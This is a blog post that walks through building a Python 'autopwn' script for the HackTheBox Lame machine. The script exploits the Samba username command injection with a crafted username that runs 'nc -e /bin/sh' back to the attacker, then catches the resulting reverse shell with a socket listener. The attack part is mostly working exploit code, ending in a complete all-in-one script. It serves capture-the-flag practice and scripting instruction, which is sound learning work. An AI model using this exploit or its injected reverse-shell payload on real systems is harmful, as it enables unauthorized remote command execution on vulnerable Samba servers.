---
layout: post
title: "HackTheBox Lame Autopwn"
permalink: /blog/lame-autopwn
---

# Building The Autopwn

For my [lame](https://agent-tiro.github.io/htb/lame) writeup I ended up making an autopwn script. Mainly as an exercise for me to keep improving my scripting knowledge. I thought it would be good to explain how it was put together and built in stages for those looking to start scripting a bit more. 

## The Exploit

The aim is to connect to the Samba share and logon with the crafted username to run a command that will connect back to a listener we set up. This part is fairly straight forward. All we need is a python library to handle the smb protocol. I used [pysmb](https://pypi.org/project/pysmb/), which has some good online [documentation](https://pysmb.readthedocs.io/en/latest/). 

First up we will set the malicious username variable, and a password to exploit the vulnerability. 

```
username = '/=`nohup nc -e /bin/sh <ip addr> <port> `'
password = 'hunter2' # this is not important
```

Now we want to import the relevant parts from the smb library and setup a connection to the Samba share. 

```
from smb.SMBConnection import SMBConnection
from smb import smb_structs

username = '/=`nohup nc -e /bin/sh <ip addr> <port> `'
password = 'hunter2' # this is not important

smb_structs.SUPPORT_SMB2 = False
conn = SMBConnection(username, password, 'doesnotmatter', 'lame', use_ntlm_v2 = True)
conn.connect('10.10.10.3', 445)
```

In this part we set support to SMB2 to false to enable connection to the older version of Samba that we are targetting. The details for the connection are completed, using the documents as a reference for what should be passed. Then connect is used to initiate the connection to the target IP and port. 

If you really wanted this could be the end of your exploit script. You could setup a netcat listener and run this exploit and enjoy your shell. Or if you wanted to challenge yourself you could try and setup your own listener in python to catch the incoming connection

## The Listener

For this I used the socket library which is well documented and has a lot of use cases that can be used to help solve problems you encounter. 

```
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((<ip addr>, <port>))
s.listen(5)
```

So now the listener is setup we need a way to accept the incoming connection when the exploit is ran. It also needs to be able to send commands to the target and receive the response. 

```
client_socket, client_addr = s.accept() # accepts the incoming connection
while True:
    command = input("") # take user input for commands
    if command.lower() == 'exit': # so we can use exit to close the shell
        break
    command = command.encode() # encode the command to be sent
    client_socket.send(command + b'\n') # send the command
    response = client_socket.recv(2048).decode() # receive the response and decode
    print(response) # print the response
client_socket.close()
s.close()
```

## The Listener Problem

The problem we have here is that if this was all combined into a script is that it wouldn't be possible to launch the listener then switch to running the exploit. The easiest way around this that I found was to use multiprocessing. This needed a bit of a rework of the above parts and to put some of them into functions. With the multiprocessing bit looking like this:

```
if __name__ == '__main__':
    p = multiprocessing.Process(name='p', target=listener)
    p1 = multiprocessing.Process(name='p1', target=exploit)
    p.start()
    time.sleep(1)
    p1.start()
    cmd()
```

This basically sets a process to the listener and another to the exploit and starts them sequentially before dropping into the command functon which accepts the inbound connection and gives command shell functionality. 

## The Final Exploit

Putting all of this together, with a little extra to take user input to set the listening host and port and you have an all in one script that will setup the listener, run the exploit and give you command line access to the target. 

```
import argparse
from smb.SMBConnection import SMBConnection
from smb import smb_structs
import socket
import multiprocessing
import time

# Create a mini help file to show which flags are required
parser = argparse.ArgumentParser(description='Lame Exploit')
parser.add_argument('-l', required=True, type=str, help='Listener IP')
parser.add_argument('-p', required=True, type=int, help='Listener Port')
args = parser.parse_args()

# Set user args to variables for use later
host = args.l
port = args.p

# Create malicious username
username = '/=`nohup nc -e /bin/sh ' + host + ' ' + str(port) + '`'
password = 'hunter2'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Set up a listener
def listener():
    s.bind((host, port))
    s.listen(5)
    print('Listening on port: ' + str(port))

# Catch that shell
def cmd():
    client_socket, client_addr = s.accept()
    print(f'{client_addr[0]}:{client_addr[1]} Connected!')
    print('Whoop! Shell Time!\n')
    while True:
        command = input("")
        if command.lower() == 'exit':
            break
        command = command.encode()
        client_socket.send(command + b'\n')
        response = client_socket.recv(2048).decode()
        print(response)
    client_socket.close()
    print('Exiting')
    s.close()

# Create SMB Connection
def exploit():
    smb_structs.SUPPORT_SMB2 = False
    conn = SMBConnection(username, password, 'doesnotmatter', 'lame', use_ntlm_v2 = True)
    print('Launching exploit')
    conn.connect('10.10.10.3', 445)
    time.sleep(1)
    close()

# Launch this thing in multiprocessing
if __name__ == '__main__':
    p = multiprocessing.Process(name='p', target=listener)
    p1 = multiprocessing.Process(name='p1', target=exploit)
    p.start()
    time.sleep(1)
    p1.start()
    cmd()
```
